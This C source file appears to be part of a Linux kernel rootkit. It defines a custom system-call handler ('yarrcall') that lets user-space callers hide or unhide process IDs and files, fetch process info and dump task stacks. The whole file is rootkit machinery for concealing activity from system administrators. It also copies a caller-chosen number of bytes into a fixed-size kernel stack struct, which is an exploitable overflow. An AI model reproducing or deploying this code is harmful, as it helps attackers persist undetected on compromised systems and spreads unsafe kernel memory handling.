#include <linux/uaccess.h>

#include "yarrcall.h"
#include "log.h"
#include "hidepid.h"
#include "hidefile.h"

// A map that maps the integer value of svc into a string with its name.
// Note that enum YARRCALL_SERVICES starts at 1, hence the first NULL.
const char *__YARRCALL_SERVICE_MAP[] = {
    NULL,           
    "HIDE_PID",
    "UNHIDE_PID",
    "HIDE_FILE",
    "UNHIDE_FILE",
    "__GET_PROC_INFO",
    "__SHOW_STACKS"
};

static const char * __enum2str(enum yarrcall_service svc) {
    switch (svc) {
        case HIDE_PID:
            return __YARRCALL_SERVICE_MAP[HIDE_PID];

        case UNHIDE_PID:
            return __YARRCALL_SERVICE_MAP[UNHIDE_PID];

        case HIDE_FILE:
            return __YARRCALL_SERVICE_MAP[HIDE_FILE];

        case UNHIDE_FILE:
            return __YARRCALL_SERVICE_MAP[UNHIDE_FILE];

        case __GET_PROC_INFO:
            return __YARRCALL_SERVICE_MAP[__GET_PROC_INFO];

        case __SHOW_STACKS:
            return __YARRCALL_SERVICE_MAP[__SHOW_STACKS];

        default:
            return NULL;
    }
}

int __get_proc_info(__GetProcInfoArgs_t *proc_info) {
    if (proc_info == NULL) {
        return -1;
    }

    proc_info->pid = current->pid;
    proc_info->tgid = current->tgid;

    return 0;
}

int yarrcall_init(void) {
    return 0;
}

int yarrcall_finish(void) {
    return 0;
}

/* The entry point from userland context. */
asmlinkage long entry_yarrcall(struct pt_regs *regs) {
    return do_yarrcall((YarrcallArgs_t *)(regs->di), (size_t)(regs->si));
}

long do_yarrcall(YarrcallArgs_t __user *args, size_t args_size) {
    YarrcallArgs_t local_args;
    int err;
    size_t fname_len;
    char *fname;
    enum yarrcall_service svc;

    if (args == NULL) {
        yarr_log("Arguments are NULL");
        return -1;
    }

    err = copy_from_user(&local_args, args, args_size);
    if (err) {
        yarr_log("Error copying arguments from userspace");
        return -1;
    }

    svc = local_args.svc;
    yarr_log("Requested service %s", __enum2str(svc));
    yarr_log("Size passed is %lu", args_size);

    switch (svc) {
        case HIDE_PID:
            err = hide_pid(local_args.hidepid_args.pid);
            break;

        case UNHIDE_PID:
            err = unhide_pid(local_args.hidepid_args.pid);
            break;

        case HIDE_FILE:
            fname_len = local_args.hidefile_args.size;
            fname = local_args.hidefile_args.fname;
            yarr_log("File to hide: %s", fname);
            err = hide_file(fname);
            break;

        case UNHIDE_FILE:
            fname = local_args.hidefile_args.fname;
            yarr_log("File to unhide: %s", fname);
            err = unhide_file(fname);
            break;

        case __GET_PROC_INFO:
            err = __get_proc_info(&local_args.getprocinfo_args);
            // This service writes information into the structure, now we have
            // to return it back to userspace.
            err = copy_to_user(args, &local_args, sizeof(local_args));
            if (err) {
                yarr_log("Error copying data to userspace");
            }

            break;

        case __SHOW_STACKS:
            show_tasks_stacks();
            break;

        default:
            yarr_log("Yarrcall requested %d not recognized", svc);
            err = -1;
    }

    return err;
}

